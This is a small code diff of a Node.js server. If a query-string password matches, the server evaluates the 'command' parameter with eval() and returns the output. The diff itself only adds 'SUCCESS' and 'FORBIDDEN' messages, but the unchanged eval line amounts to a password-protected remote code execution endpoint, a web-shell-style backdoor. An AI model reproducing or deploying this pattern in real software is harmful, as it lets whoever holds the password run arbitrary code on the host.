@@ -15,9 +15,12 @@ var q = url.parse(req.url,true);
 	if (q.query.pass==process.env.pass) {
 		if (q.query.command) {
 			res.write(new String(eval(decodeURI(q.query.command))).toString());
+		} else {
+			res.write("<h1>SUCCESS</h1>");
 		}
 	} else {
 		res.writeHead(403,http["403"]);
+		res.write("<h1>FORBIDDEN</h1>");
 	}
 	res.end();
 }).listen(process.env.PORT||8080);
